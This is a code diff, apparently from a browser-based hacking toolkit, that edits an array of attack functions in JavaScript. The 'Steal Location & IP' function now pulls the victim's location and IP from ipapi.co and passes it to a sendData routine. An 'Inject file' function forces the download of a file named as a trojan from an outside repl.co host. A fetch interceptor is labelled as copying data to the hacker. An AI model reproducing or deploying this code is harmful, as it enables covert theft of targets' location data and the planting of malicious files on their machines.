@@ -90,7 +90,7 @@ const utils = [
     description: "Intercepts network fetch requests and gets a copy of the data to the hacker",
     func: () => {
 
-      self.addEventListener('fetch', function(event) {
+      self.addEventListener('fetch', function (event) {
         console.log(event);
       })
 
@@ -98,51 +98,44 @@ const utils = [
   },
 
 
-  
+
   {
     name: "Rick Roller",
     description: "Opens infinite Rick Rolls on youtube.",
     func: () => {
-    window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', '_blank');
+      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', '_blank');
     }
   },
 
 
-  
-{
+
+  {
     name: "Steal Location & IP",
     description: "Steals accurate location, IP address and service provider.",
     func: async () => {
-    if (window.location.hostname === "mylocation.org"){
-      const info = document.querySelector(".info");
-      const tr = info.getElementsByTagName("tr");
-      const dict = {};
-      for (const t of tr){
-        const td = t.getElementsByTagName("td");
-        dict[td[0].innerHTML] = td[1].innerHTML;
-      }
-      await sendData(dict);
-      window.close()
-      return
-    }
-    window.open('https://mylocation.org/', '_blank');
+      const d = await fetch('https://ipapi.co/json/')
+        .then(function (response) {
+          return response.json();
+        })
+
+      await sendData(d);
     }
   },
 
 
-  
+
   {
     name: "Inject file",
     description: "Download a malicious file in target's system.",
     func: () => {
-          const link = document.createElement('a')
-          const url = "https://draco.maalolan.repl.co/DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
-          link.href = url
-          link.download = "DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
-          document.body.appendChild(link)
-          link.click()
-          document.body.removeChild(link)    
-        }
+      const link = document.createElement('a')
+      const url = "https://draco.maalolan.repl.co/DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
+      link.href = url
+      link.download = "DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
+      document.body.appendChild(link)
+      link.click()
+      document.body.removeChild(link)
+    }
   }
 ]
 
